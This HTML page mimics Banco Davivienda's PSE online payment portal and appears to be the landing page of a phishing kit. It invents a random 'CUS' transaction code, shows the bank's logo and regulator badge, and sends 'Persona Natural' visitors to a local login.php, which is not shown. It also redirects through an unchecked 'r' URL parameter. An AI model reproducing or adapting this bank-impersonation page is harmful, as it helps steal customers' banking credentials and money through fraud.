<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Paga con Davivienda</title>
    <style>
        .spinner {
           width: 100px;
           height: 100px;
           border-radius: 50%;
           background: radial-gradient(farthest-side,#F02D25 94%,#0000) top/9px 9px no-repeat,
                  conic-gradient(#0000 30%,#F02D25);
           -webkit-mask: radial-gradient(farthest-side,#0000 calc(100% - 9px),#000 0);
           animation: spinner-c7wet2 1s infinite linear;
        }
        
        @keyframes spinner-c7wet2 {
           100% {
              transform: rotate(1turn);
           }
        }
    </style>
</head>
<body>
    
    <main class="relative flex flex-col items-center justify-start w-full h-dvh">
        <span id="leftMsg" class="hidden flex items-center z-50 bg-black bg-opacity-80 justify-center absolute top-0 bottom-0 left-0 right-0">
            <div class="relative bg-[white] p-6 py-8 min-w-[200px] rounded-lg">
                Lo sentimos no pudimos completar la transacción.
                <button onclick="window.location.assign( new URLSearchParams(window.location.search)?.get('r') )" class="p-4 py-2 absolute left-[36%] -bottom-6 rounded-full text-white bg-[#F02D25]">
                    Terminar
                </button>
            </div>
        </span>
        <span id="loader" class="hidden flex items-center z-50 bg-black bg-opacity-80 justify-center absolute top-0 bottom-0 left-0 right-0">
            <div class="relative ">
                <img src="./assets/logoh1.png" class="max-w-[70px]" alt="" srcset="">
                <span class="absolute -top-12 -left-4 spinner"></span>
            </div>
        </span>

        <div class="bg-[#E62221] w-full flex justify-center items-center py-4">
            <img src="./assets/logoh1.png" alt="Davivienda Logo" class="h-10">
        </div>

        <div class="bg-white w-full flex flex-col items-center py-2 border-b border-gray-200">
            <p id="date" class="text-[13px] text-gray-500 font-normal">Miércoles 15 de Abril de 2026, 10:08 PM</p>
            <p id="cus_code" class="text-[13px] text-gray-500 font-normal">Código único CUS: 228076640</p>
        </div>

        <div class="relative flex flex-col w-full items-center h-full bg-[url(./assets/bg.jpg)] bg-cover bg-center">
            <div class="absolute inset-0 bg-black bg-opacity-40"></div>
            
            <div class="relative z-10 flex flex-col items-center w-full">
                <span class="flex flex-col mt-20">
                    <h1 class="text-[28px] text-center text-white font-light">Bienvenido al Portal de</h1>
                    <h1 class="text-[32px] text-center text-white font-bold leading-tight">Pagos en Línea y PSE</h1>
                </span>

                <h1 class="text-[18px] mt-6 text-center text-white font-light px-4">Seleccione el canal por el cual realizará el pago:</h1>
            
                <div class="flex flex-row gap-8 mt-16">
                    <span id="btnPersonas" class="group cursor-pointer rounded-2xl justify-center w-[130px] h-[130px] bg-[#333333] hover:bg-[#444444] transition-all flex flex-col items-center p-4">
                        <img class="w-10 h-10 mb-2 invert brightness-0" src="./assets/pni.png" alt="">
                        <p class="text-center text-white text-[12px] font-light leading-tight">Persona <br/> Natural</p>
                    </span>
                    
                    <span onclick="alert('Esta seccion no esta disponible en este momento.')" class="group cursor-pointer rounded-2xl justify-center w-[130px] h-[130px] bg-[#333333] hover:bg-[#444444] transition-all flex flex-col items-center p-4 opacity-80">
                        <img class="w-10 h-10 mb-2 invert brightness-0" src="./assets/ei.png" alt="">
                        <p class="text-center text-white text-[12px] font-light">Empresa</p>
                    </span>
                </div>

                <div class="text-white font-light text-center mt-20 leading-relaxed">
                    <p class="text-[16px]">No olvide Cerrar Sesión</p>
                    <p class="text-[16px]">una vez termine sus transacciones.</p>
                </div>
            </div>
        </div>

        <footer class="bg-black text-white flex flex-col items-center justify-center py-4 w-full">
            <p class="text-[14px] mb-2">Banco Davivienda S.A. Todos los derechos reservados 2026 .</p>
            <img src="./assets/vigilado2.svg" alt="Vigilado" class="h-4">
        </footer>
    </main>
    <script>
        const now = new Date();
        const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
        const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
        
        const dateStr = `${days[now.getDay()]} ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}, ${now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', hour12: true }).toUpperCase()}`;
        document.getElementById("date").textContent = dateStr;

        if (!localStorage.getItem('cus_code')) {
            localStorage.setItem('cus_code', Math.floor(100000000 + Math.random() * 900000000));
        }
        document.getElementById("cus_code").textContent = "Código único CUS: " + localStorage.getItem('cus_code');
        
        const btnPersons = document.getElementById("btnPersonas");
        btnPersons.addEventListener("click", () => {
            window.location.assign('login.php');
        })
    </script>
</body>
</html>